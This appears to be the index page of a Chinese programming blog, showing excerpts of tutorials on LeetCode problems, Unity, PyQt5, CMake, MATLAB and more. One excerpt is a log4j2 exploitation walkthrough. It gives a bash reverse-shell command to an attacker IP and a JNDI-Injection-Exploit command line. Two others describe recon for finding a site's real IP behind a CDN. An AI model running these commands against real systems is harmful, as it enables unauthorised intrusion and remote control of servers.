<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程中国的博客">
		<meta property="og:title" content="编程中国的博客" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e85a68e1820ef631f2c7df0a19efa4b5/" rel="bookmark">
			前端开发必背单词
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 导航类： 导航：nav标题：title摘要：summary菜单：menu子菜单：submenu主导航：mainnav子导航：subnav顶导航：topnav边导航：sidenav 功能类： 标志:logo登录:login图标:icon状态:status热点:hot版权:copyright登录条:loginbar小技巧:tips提示信息:msg滚动:scroll指南:guild搜索:search功能区:shop文章列表:list台作伙伴:parthier面包屑:breadCrumb当前的:current标签页:tab投票:vote下载:download按钮:btn新闻:news服务:service注释:note注册:regsiter广告:banner友情链接:friendlink 页面布局类 容器:container页头:header内容:content页尾:footer栏目:column页面主体:main左右中:left right center控制整体布局宽度:wrapper css 线:line穿过:through宽度:width行:row溢出:overflow图像:image样式:style父级:parent修饰:decoration对齐:align隐藏:hidden子级:children显示:visible资源:source正常:normal位置:position身体:body字体:font列表:list填充:padding大小:size重复:repeat下面的:under主体:main标题:title外边界:margin加粗:bold 其他： password密码 broswer浏览器 html超文本标记语言 radio单选 css层叠样式表 checkbox多选 javascript前端脚本语言名字 select下拉菜单 option选项 method 方法 text文本 collapse合并 next下一个 mustache胡子 position定位 computed计算 prev前一个(previous) parent父母 watch监听 children孩子 filters过滤器 mounted挂载 click 点击 static静态定位 mouseleave鼠标移开 mouseenter鼠标进入 let定义变量 script脚本 string 字符串 animate 动画 const定义常量 number 数字 slide滑动 boolean布尔 fade渐进 undefined未定义 show显示 hide隐藏 null空(None) function函数 test测试 stopProperation阻止冒泡 document文档 get获取 preventDefault阻止默认行为 ajax(web数据交互方式) element元素 by通过 type 类型 tagName 标签名 url统一资源定位符 window窗口 data 数据 object 对象 dataTpye数据类型 array数组 success成功 error错误 true成功 false失败 warn警告 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0620c325926a5be53fce648ca02c9cca/" rel="bookmark">
			MATLAB读取Excel标题行特定字符对应数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MATLAB读取Excel标题行特定字符对应数据 在Matlab数据处理中，常需要导入excel数据，在数据维数较少时可以比较容易读取对应数据。
当处理大量数据时可以利用matlab中的 find() 和 contains() 函数读取。
读取流程 1-选取需要的月份；
2-利用[num,txt] = xlsread(___)函数读取表格中文本数据（num）前面的数值数据的前导列（txt）；
3-利用for循环查找各月份所在列；
4-利用contains()函数判断标题行是否存在所查找月份；
5-利用find()函数确定所在列位置
具体matlab代码如下 根据输入的3月，4月和7月，输出对应的数组
clc clear all month=['3月';'4月';'7月']; [h,l]=size(month); f=cellstr(month);%转换属性为cell array [data,txt]=xlsread('例子.xlsx'); for i=1:h %找到输入的3个月份所在列 a=f(i,:); index(i)=find(contains(txt(1,:),a)==1); end result=data(:,index-1); 输出结果为如下
同样的可以读取具体月份和项目的对应数据
month='7月';%月份 project='AC';%项目 m1=cellstr(month); p1=cellstr(project); [data,txt]=xlsread('例子.xlsx'); index1=find(contains(txt(1,:),m1)==1); index2=find(contains(txt(:,1),p1)==1); result=data(index2-1,index1-1); 欢迎大家交流讨论！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9cbdbf48dbdbd470bf503cbb16d82bb/" rel="bookmark">
			【Unity 3D 从入门到实战】Unity 3D 导航系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一，前言
二，导航系统介绍
三，Navigation总控制面板介绍
1，Agents面板（导航参数设置）
2，Areas面板（层设置）
3，Bake面板（烘焙导航网格）
4，Object面板（对象） 四，Navigation组件介绍
1，Nav Mesh Agent（自动寻路组件）
2，Nav Mesh Obstacle（障碍物组件）
3，Off Mesh Link（跳跃组件）
一，前言 很多游戏都有一个自动寻路的功能，例如在游戏场景中单击某一个位置，角色就会自动的选择一条相对优先的路线过去。Unity 3D 自带导航系统，将寻路的代码封装起来，集成了 Navigation 导航系统，降低了开发难度，提高了游戏角色寻路的稳定性。Navigation 是一种用于实现动态对象自动寻路技术，它将游戏场景中复杂的结构关系简化为带有一定信息的网络，并基于这些网络经过一系列相应的计算实现自动寻路。当前 Unity 版本：2021.3.13f1c1 LTS 二，导航系统介绍 Unity 3D 导航系统由 1个Navigation总控制面板 和 3个组件 组成，该系统是由 A*算法 延伸扩展实现的。
菜单栏选择：Window -&gt; AI -&gt; Navigation 命令打开 Navigation 总控制面板，它由4部分组成，分别是 Agents，Areas，Bake，Object。 三个组件分别是自动寻路组件，障碍物组件，跳跃组件，如下图显示。 三，Navigation总控制面板介绍 1，Agents面板（导航参数设置） Name：设置烘焙 Agents 的名字。Radius：烘焙的半径，也就是对象烘焙的半径。这个值影响对象能通过的路径的大小，值越小，能行走的路径越大，边缘区域越小。Height：具有代表性的对象的高度，可以通过的最低的空间高度。值越小，能通过的最小高度越小。Step Height：梯子的高度。需要根据模型阶梯的高度设置。Max Slope：烘焙的最大角度，即坡度。 2，Areas面板（层设置） 该面板可以设置在自动寻路时，对象可以通过那些层。 这里输入的名称会在 Object 面板的 Navigation Area 下显示。
3，Bake面板（烘焙导航网格） Agent Radius：具有代表性的对象的半径，半径越小生成的网格面积越大。Agent Height：具有代表性的对象的高度。Max Slope：斜坡的坡度。Step Height：台阶的高度。Drop Height：允许最大的下落距离。Jump Distance：允许最大的跳跃距离。Min Region Area：网格面积小于该值则不生成导航网格。Height Mesh：勾选后会保存高度信息，同时会消耗一些性能和存储空间。 4，Object面板（对象） 在该面板中可以选择，设置要参与导航网格烘焙的对象，可以设置对象是可以被自动寻路的，如路面。也可以设置对象是不可以被自动寻路的（即不可行走），如湖面。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9cbdbf48dbdbd470bf503cbb16d82bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a8f6bab582f8e75b05964569aa0c225/" rel="bookmark">
			leetcode(力扣)算法刷题-160. 相交链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述：
给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表不存在相交节点，返回 null 。
图示两个链表在节点 c1 开始相交：
题目数据保证整个链式结构中不存在环。
注意，函数返回结果后，链表必须 保持其原始结构 。
示例1：
输入：intersectVal = 8, listA = [4,1,8,4,5], listB =[5,6,1,8,4,5], skipA = 2, skipB = 3
输出：Intersected at ‘8’
解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。
从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,6,1,8,4,5]。
在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。
— 请注意相交节点的值不为 1，因为在链表 A 和链表 B 之中值为 1 的节点 (A 中第二个节点和 B 中第三个节点) 是不同的节点。换句话说，它们在内存中指向两个不同的位置，而链表 A 和链表 B 中值为 8 的节点 (A 中第三个节点，B 中第四个节点) 在内存中指向相同的位置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a8f6bab582f8e75b05964569aa0c225/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ac7ff8d7b1b1d03a6e41b1a0a253843/" rel="bookmark">
			pyqt5 QDoubleSpinBox信号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 QDoubleSpinBox 类提供了多种信号，它们用于监听用户对浮点数输入框的操作。下面是 QDoubleSpinBox 类所有的信号：
valueChanged：当用户更改了输入框中的数值时发出。 editingFinished：控件失去焦点或用户按下Enter键发出。 customContextMenuRequested：当用户请求弹出自定义上下文菜单时发出。 destroyed：当 QDoubleSpinBox 对象被销毁时发出。 objectNameChanged：当 QDoubleSpinBox 对象的 objectName 属性发生更改时发出。 要使用这些信号，可以在创建 QDoubleSpinBox 对象后，使用其 connect() 方法将信号与一个回调函数相关联。
在下面的例子中，我们创建了一个 QDoubleSpinBox 对象，并将其所有信号都与一个自定义的回调函数 printSignal() 相关联，实现了当用户对输入框进行操作时，将信号名称打印出来的功能。
from PyQt5.QtWidgets import QDoubleSpinBox, QApplication import sys # 定义一个回调函数 def printSignal(signal): print('当前信号:', signal) if __name__ == "__main__": app = QApplication(sys.argv) # 创建 QDoubleSpinBox 对象 doubleSpinBox = QDoubleSpinBox() # 将所有信号与 printSignal() 回调函数相关联 doubleSpinBox.valueChanged.connect(printSignal) doubleSpinBox.editingFinished.connect(printSignal) doubleSpinBox.customContextMenuRequested.connect(printSignal) doubleSpinBox.destroyed.connect(printSignal) doubleSpinBox.objectNameChanged.connect(printSignal) doubleSpinBox.show() sys.exit(app.exec_()) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15a65bfe146bfce518106b3af5fe54d1/" rel="bookmark">
			leetcode(力扣)算法刷题-回文链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 描述：
给你一个单链表的头节点 head ，请你判断该链表是否为回文链表。如果是，返回 true ；否则，返回 false 。
示例 1：
输入：head = [1,2,2,1]
输出：true
示例 2：
输入：head = [1,2]
输出：false
思路：
对于本题来说，链表这种弯弯绕绕的东西，可以把它转换成数组，取出其中的值，然后反转，判断与原数组是否相等即可。
bool isPalindrome(ListNode* head) { vector&lt;int&gt;node_array; vector&lt;int&gt;node_array_flip; while(head!=NULL) { node_array.push_back(head-&gt;val);//取出结点值 head=head-&gt;next; } node_array_flip=node_array; reverse(node_array.begin(),node_array.end());//反转 if(node_array_flip==node_array) { return true; } return false; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b345022d6b6c09586899223a3e10312/" rel="bookmark">
			牛客算法刷题-BM6 判断链表中是否有环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 描述
判断给定的链表中是否有环。如果有环则返回true，否则返回false。
数据范围：链表长度 0 ≤ \leq ≤ n ≤ \leq ≤ 10000，链表中任意节点的值满足 |val| ≤ \leq ≤ 100000。
要求：空间复杂度 O(1)，时间复杂度 O(n)。
输入分为两部分，第一部分为链表，第二部分代表是否有环，然后将组成的head头结点传入到函数里面。-1代表无环，其它的数字代表有环，这些参数解释仅仅是为了方便读者自测调试。实际在编程时读入的是链表的头节点。
例如输入{3,2,0,-4},1时，对应的链表结构如下图所示：
可以看出环的入口结点为从头结点开始的第1个结点（注：头结点为第0个结点），所以输出true。
示例1
输入：{3,2,0,-4},1
返回值：true
说明：第一部分{3,2,0,-4}代表一个链表，第二部分的1表示，-4到位置1（注：头结点为位置0），即-4-&gt;2存在一个链接，组成传入的head为一个带环的链表，返回true
示例2
输入：{1},-1
返回值：false
说明：第一部分{1}代表一个链表，-1代表无环，组成传入head为一个无环的单链表，返回false
示例3
输入：{-1,-7,7,-4,19,6,-9,-5,-2,-5},6
返回值：true
思路：
可以定义两个快、慢指针，快指针一定比慢指针多走一步，如果该链表中没有环，快指针的下一个结点一定是NULL，则返回false；如果有环，快指针会先进入循环链表中奔跑，等待着慢指针走向循环链表，等慢指针进入循环链表中后，快指针就在后面追赶，总有一天，它们会相遇。
bool hasCycle(ListNode *head) { if(head==NULL) { return false; } //快慢指针 ListNode* fast=head; ListNode* slow=head; //如果没环快指针会先到末尾 while(fast!=NULL &amp;&amp; fast-&gt;next!=NULL) { //快指针移动两步 fast=fast-&gt;next-&gt;next; //慢指针移动一步 slow=slow-&gt;next; //相遇则有环 if(fast==slow) { return true; } } //末尾无环 return false; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f42cf88b313a1c8dfe2ccc54814ec6a/" rel="bookmark">
			牛客算法刷题-BM52 数组中只出现一次的两个数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述
一个整型数组里除了两个数字只出现一次，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。
数据范围：2 ≤ \leq ≤n ≤ 1000 \leq1000 ≤1000，数组中每个数的大小0 ≤ \leq ≤n ≤ 1000000 \leq1000000 ≤1000000。
要求：空间复杂度 O(1)，时间复杂度 O(n)。
提示：输出时按非降序排列。
示例1
输入：[1,4,1,6]
返回值：[4,6]
说明：返回的结果中较小的数排在前面
示例2
输入：[1,2,3,3,2,9]
返回值：[1,9]
思路：
对于查找类的题目，可以先思考用哈希表的方式来解决，对于数组中的数字，进行哈希表查找，如果找到了，则哈希表中的元素个数+1，最后从哈希表中返回元素个数=1的键(key)。
/** * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可 * * * @param array int整型vector * @return int整型vector */ vector&lt;int&gt; FindNumsAppearOnce(vector&lt;int&gt;&amp; array) { // write code here map&lt;int,int&gt;hash;//定义hashmap，hashmap中会自动进行升序排序 vector&lt;int&gt;res; int count=1; for(int i=0;i&lt;array.size();i++) { if(hash.find(array[i])==hash.end())//未找到对于key值 { hash[array[i]]=1;//将[键，值]添加进hashmap中 } else { hash[array[i]]=hash[array[i]]+1;//如果找到了键，则元素value+1 } // cout&lt;&lt; array[i]&lt;&lt;" "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f42cf88b313a1c8dfe2ccc54814ec6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94b2227842bc12e5703f5928803fbfa1/" rel="bookmark">
			通过子域名查询真实ip地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法原理 开启反向代理或CDN部署需要一定的时间成本和经济成本，部分网站会采用关键域名使用CDN或反向代理的方法，部分子域名由于进行内部测试的原因未及时设置CDN或反向代理，用户可通过子域名查找工具尝试从子域名角度获取站点真实IP地址。
方法解析 目标站点中的任何一个子域名都需要通过DNS服务建立域名与IP映射，DNS记录将被DNS服务提供商记录。通过查询子域名DNS记录，有机会获取并推测目标站点使用的真实IP地址信息。
检测方法 分析子域名信息及对应IP地址，尝试筛选可能的站点真实IP。键入需要获取站点真实IP的域名，并进行子域名查询。访问威胁情报平台或DNS服务记录平台。 测试示例如下图所示， 利用微步情报平台查询baidu.com子域名及对应IP地址。
测试示例如下图所示， 利用DNSdb平台查询baidu.com子域名及子域名所对应的IP地址信息。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dec731f64e04fdc8bebdc30a3e29d1b1/" rel="bookmark">
			ubuntu ssh执行命令问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ssh 到ubuntu机器执行命令，例如：ssh 127.0.0.1 'echo $JAVA_HOME' 会出现空行
以前用opensuse和centos都没遇到这种问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab11ca233fc2a6ccfa6177526cd0674a/" rel="bookmark">
			log4j2漏洞检测和利用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.漏洞检测 漏洞检测使用的是BP插件，插件地址。
2.利用 JNDI注入工具，工具地址 https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0，命令如下：
将以下命令进行base64编码，IP替换为你攻击机IP。
bash -i &gt;&amp; /dev/tcp/x.x.x.x/6553 0&gt;&amp;1 使用工具命令如下：
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,base64编码}|{base64,-d}|{bash,-i}" -A 120.77.202.2 burp发包：
反弹shell成功：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b067f147612226e75e7ddf11fa0b929/" rel="bookmark">
			js数组循环符合条件跳出循环体（for、forEach、some、every）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，for循环
for(var i=0;i&lt;10;i++){ console.log(i) if(i==3){ break; } } 输出结果为0 1 2 3 此处用break可跳出for循环，如果for循环外层是一个函数体并且之后无任何操作也可用reatun阻止循环
2，forEach
let list = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]; try{ list.forEach(item=&gt;{ console.log(item) if(item===3){ throw new Error("finish") } }) }catch(e){ if(e.message!=="finish"){ console.log(e.message) } } 输出结果为0 1 2 3 如果直接使用forEach无论如何是不能跳出循环的，需要借助try catch抛出错误来阻止循环
3、some
let list = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]; list.some(item=&gt;{ console.log(item) if(item===3){ return true } }) 输出结果为0 1 2 3 es6中的some也可实现此功能。some循环中只要有一个符合条件则会跳出循环体
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b067f147612226e75e7ddf11fa0b929/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acb30e0096e7e0d7b67134f952412fb9/" rel="bookmark">
			OSG开发-使用VisualStudio2019创建CMake项目方式开发HelloOSG
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文保证你使用VS2019，可以把这个OSG程序开发出来，看到那个蓝色的带有纹理的地球。
大概步骤如下：
下载已经编译好的OSG的库和头文件新建一个CMake项目编辑make.txt编写main.cpp运行。 下载已经编译好的OSG的库和头文件 由于我们需要用OSG的库来做开发，当然就需要下载人家的库了。去
OpenSceneGraph | Objexx Engineering，下载，我下载的是和VS2019配套的那个，下载后解压到E盘，OSG目录下，形成如下目录就ok。
然后可以把这个bin目录放入系统环境变量path中，如图：
path的值中添加；E:\OSG\OpenSceneGraph-3.6.5-VC2019-64-Debug\bin，别忘记这个分号。
这样这个目录下面的N多DLL文件就可以被找到了。有这么多DLL文件呢。
比较重要的就是这个osgd.dll，如果不设置环境变量，就会提示找不到这个osgd.dll的错误。
新建一个CMake项目 打开VS2019，新建项目，选择CMake项目，起个名字，本文名字是：CMakeProject_FirstOSG
创建这个项目成功后，项目目录如下：
注意观察会发现有两个CMakeLists.txt文件，一个是总体的，一个是项目CMakeProject_FirstOSG
项目目录下面的。我们主要是修改这个项目CMakeProject_FirstOSG项目目录下面的CMakeLists.txt文件，总体的我们不需要管。不过可以把总体的makefile内容放在这里看一下：
# CMakeList.txt: 顶层 CMake 项目文件，在此处执行全局配置 # 并包含子项目。 # cmake_minimum_required (VERSION 3.8) project ("CMakeProject_FirstOSG") # 包含子项目。 add_subdirectory ("CMakeProject_FirstOSG") 这个就是做一些全局的配置，添加个子目录，不去修改它。
编辑make.txt 引入osg库，首先要告诉编译器库头文件的位置。在CMake中使用include_directories()指令实现。
include_directories()指令告诉编译器搜索头文件的路径。
我们还要告诉编译器库文件的位置。在CMake中使用link_directories()指令实现，link_directories()指令告诉链接器器搜索库文件的路径。
接下来我们还要告诉编译器，具体链接哪个库文件。在CMake中使用target_link_libraries()指令实现。target_link_libraries()指令指定哪些库需要链接到目标上。
总之最后这个makefile的内容如下：
# CMakeList.txt: CMakeProject_FirstOSG 的 CMake 项目，在此处包括源代码并定义 # 项目特定的逻辑。 # cmake_minimum_required (VERSION 3.8) #设定环境变量：OSG_DIR set(OSG_DIR "E:/osg/OpenSceneGraph-3.6.5-VC2019-64-Debug") #包含文件的目录是：OSG_DIR 下面的include目录 include_directories(${OSG_DIR}/include) #需要链接的库文件所在目录为：OSG_DIR下面的lib link_directories(${OSG_DIR}/lib) # 将源代码添加到此项目的可执行文件。(下面的语句是VS自动生成的：CMakeProject_FirstOSG是exe文件的名字，后面是所有源文件的名字) add_executable (CMakeProject_FirstOSG "CMakeProject_FirstOSG.cpp" "CMakeProject_FirstOSG.h") # TODO: 如有需要，请添加测试并安装目标 target_link_libraries(CMakeProject_FirstOSG osgd	osgViewerd osgDBd) 注意：以上makefile里面的内容是有顺序的，顺序不对，会提示出错，也会提示让你选择启动项。出现这个说明add_executable()前面有一些内容设置的不对，该把 add_executable()放在靠前的位置。总之，就用我这个例子文件，不要修改语句的顺序。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acb30e0096e7e0d7b67134f952412fb9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b10a5ebf74db8d152e1866c26c57fe05/" rel="bookmark">
			获取站点真实IP地址-多地点Ping方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法原理 当站点采用CDN架构进行部署时，则用户在访问网站时，请求需要经CDN节点进行处理，随后在根据CDN节点提供的访问接入服务器信息，访问站点并获取站点提供的服务。通常情况下CDN节点将会根据请求客户端的地理位置，选取地理位置距离客户端最近的访问接入服务器，为用户或客户端提供服务。
​​​​​​​方法解析 调用Ping命令向某个域名发起ICMP echo request请求时，请求主机会调用DNS查询协议查询目标域名对应的IP地址，当不同区域服务器查询的返回IP地址不一致，则说明站点采用了CDN架构进行部署，目标服务器可有多个IP对外提供服务：即返回的IP地址非服务器真实IP。如果响应ICMP数据的的IP地址一致，则查询结果对应的IP地址通常为目标服务器的真实IP地址。
​​​​​​​检测条件 待检测的目标站点服务器正常运行，未在防火墙处配置禁ping策略，可正常对外提供网络访问服务，发起ICMP echo request请求的主机的本地DNS代理处于正常工作状态。在网络不通，或目标服务器防火墙配置了禁ping策略时，则检测数据包将超时。
​​​​​​​检测方法 1．使用http://ping.chinaz.com/，https://ping.aizhan.com/等多地点ping检测工具，输入目标站点域名，通过向目标站点发送ICMP echo request的方法进行ping检查。
2．根据检测工具利用不同监测点发出的echo request数据包，目标站点所在服务器将响应echo reply数据包，通过提取echo reply数据包中的IP地址，多地点ping检测工具会通过列表形式向工具使用者展示目标域名所部署服务器的IP地址。
3．查看多地点ping工具的监测结果列表，当展示的站点IP信息存在多个不同值时，通常代表目标站点采用了CDN架构。当站点响应IP地址信息为单个值时，通常该地址即为目标站点的真实IP地址。
测试示例如下图所示，以域名baidu.com为例，图中的响应IP地址信息表明，baidu.com域名有两组IP地址响应了由ping监测服务器发出的ICMP echo request数据包。
另一组测试示例如下图所示，以分析站点csdn.net的真实IP为例，图中的响应IP地址信息列表表明，csdn.net域名有一组IP地址响应由ping监测服务器发出的ICMP echo request数据包，经分析可推测站点IP地址为39.106.226.142。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/782463708aca0ec20e37e46680b67fdc/" rel="bookmark">
			IOS真机调试包 iOS15.0
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最新 iOS 真机调试包15.0 最近一不小心升级IOS15.0，我滴个乖乖！
由于xcode还是用的12.0，也不算太旧，就不想升级（因为升级xcode14要12.4G，然后还需要更新mac系统，当然最可怕的还是安装，需要耗时2小时左右，而下载只需要20来分钟，真的是无语）
个人建议还是下载个调试包快一点，不耽误工作，5分钟就搞定了，何不快哉。
使用现版本Xcode，只更新指定版本的真机调试包，就可以解决-这个问题，步骤如下：
1.下载和手机系统版本对应的 DeviceSupport 文件。
2.前往文件夹，并将文件解压后放到该目录下。
/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport
1
3.重启Xcode即可。
IOS15.0真机调试包下载
IOS16.0~16.1
https://download.csdn.net/download/disiongo/87243754
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aedbbb9e1eec23b6de2ec304d1b671c0/" rel="bookmark">
			C语言实例|使用C程序优雅地杀掉其它程序进程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C语言文章更新目录 C语言学习资源汇总，史上最全面总结，没有之一
C/C++学习资源（百度云盘链接）
计算机二级资料（过级专用）
C语言学习路线（从入门到实战）
编写C语言程序的7个步骤和编程机制
C语言基础-第一个C程序
C语言基础-简单程序分析
VS2019编写简单的C程序示例
简单示例，VS2019调试C语言程序
C语言基础-基本算法
C语言基础-数据类型
C语言中的输入输出函数
C语言流程控制语句
C语言数组——一维数组
C语言数组——二维数组
C语言数组——字符数组
C语言中常用的6个字符串处理函数
精心收集了60个C语言项目源码，分享给大家
C语言核心技术——函数
C代码是怎样跑起来的？
C语言实现字符串的加密和解密
C语言——文件的基本操作
使用C语言链表创建学生信息并且将信息打印输出
图解C语言冒泡排序算法，含代码分析
实例分析C语言中strlen和sizeof的区别
开发C语言的3款神器，VS2019、VScode和IntelliJ Clion
动图图解C语言选择排序算法，含代码分析
动图图解C语言插入排序算法，含代码分析
C语言指针数组和数组指针详解
5分钟搞懂C语言中的传值和传址
C语言——动态数组的创建和使用
C语言实例专栏（持续更新中…）
需求 使用C语言编写程序，杀掉\终了指定的程序进程。
程序列表里有一个正在运行的notepad2.exe,它的进程号是22516，下面通过编写代码将进程号是22516的程序杀掉。
实例代码 // // Created by 冲哥 on 2022/12/04. // 微信关注【C语言中文社区】，免费领取500G学习资料 // #include &lt;stdio.h&gt; #include "windows.system.h" int KillProcess(DWORD ProcessId); int main() { int rc; int pid = 0; printf("please input pid: "); scanf("%d", &amp;pid); rc = KillProcess(pid); if (rc == 0){ printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aedbbb9e1eec23b6de2ec304d1b671c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ea3959a6a9d4ea5acecc2aba1d1c820/" rel="bookmark">
			JAVA复习【10】十进制转换为二进制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		十进制转换为二进制
方法一；直接使用转换函数
// 将数字转换成字符串 Integer.toString(num); // 将数字转换成二进制 Integer.toBinaryString(num); // 将数字转换成八进制 Integer.toHexString(num); // 将数字转换成十六进制 Integer.toOctalString(num); import java.util.*; public class Main { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); int num = scanner.nextInt(); System.out.println(Integer.toBinaryString(num)); } } 方法二； 使用方法Integer.toString(int num, int tar)
import java.util.*; public class Main { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); int num = scanner.nextInt(); System.out.println(Integer.toString(num, 2)); } } 方法三：根据转换逻辑实现，使用递归方法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ea3959a6a9d4ea5acecc2aba1d1c820/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f951faa6a515b68cbb57b1e2f858245/" rel="bookmark">
			Android OTA差分包制作（RK平台）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、步骤说明 1. 编译两个新旧版本，需要用到两个版本的rk3566_r-target_files-eng.zip文件。
2. 将两个版本的rockdev/Image-rk3566_r/rk3566_r-target_files-eng.zip拷贝到某个制作空间下，建议文件命名带上型号及版本号，方便维护，如：
rk3566_r-target_files-XXModel-V3.0.0.zip
rk3566_r-target_files-XXModel-V3.0.1.zip
3. 在源码目录下执行source和 launch操作。
4. 使用源码中ota_from_target_files脚本制作差分包：
./build/tools/releasetools/ota_from_target_files -p out/host/linux-x86 -k build/target/product/security/testkey -i version_low.zip version_high.zip ota_version_low_to_version_high.zip
参数含义：
-p：执行脚本所需的依赖库路径
-k：指定系统所使用的签名
注：
1.以上两个参数必须带上，否则会报错；
2.会依赖 out/host/linux-x86目录下的相关资源。
不同平台估计有差异，以实际为准。
二、示例 1. 拷贝版本到制作空间
cp /data/version/rk3566_r11/Image-rk3566_r_83372e_1123/rk3566_r-target_files-eng.zip ota_diff_space/rk3566_r-target_XXX_V3.0.0.zip
cp rkcode_sdk11.0_r11/rockdev/Image-rk3566_r/rk3566_r-target_files-eng.zip ota_diff_space/rk3566_r-target_XXX_V3.0.1.zip
2. 进到源码根目录，先执行source和lunch
source build/envsetup.sh
lunch 51
3. 执行差分包制作命令：
